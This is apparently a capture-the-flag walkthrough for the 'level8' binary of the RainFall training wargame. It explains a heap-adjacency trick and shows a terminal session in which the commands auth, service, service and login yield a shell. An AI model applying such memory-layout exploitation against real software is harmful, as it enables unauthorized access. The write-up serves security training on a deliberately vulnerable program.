# Walkthrough

**Main** : 
The goal of exploiting the vulnerability in the program called "level8" is to gain unauthorized access over the program's execution by accessing sensitivearray that is not supposed to be accessible .


**Process**:  
>   the idea it's to make three malloc, then  from the first pointer you can read what is on the second, and vice versa.<br/> 
>   Just read further than what has been allocated<br/>
>   Initially auth point on the first alloc addr `x804a008` <br/>

![Alt alloc](alloc.png)

## Solution 


```
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ 
```
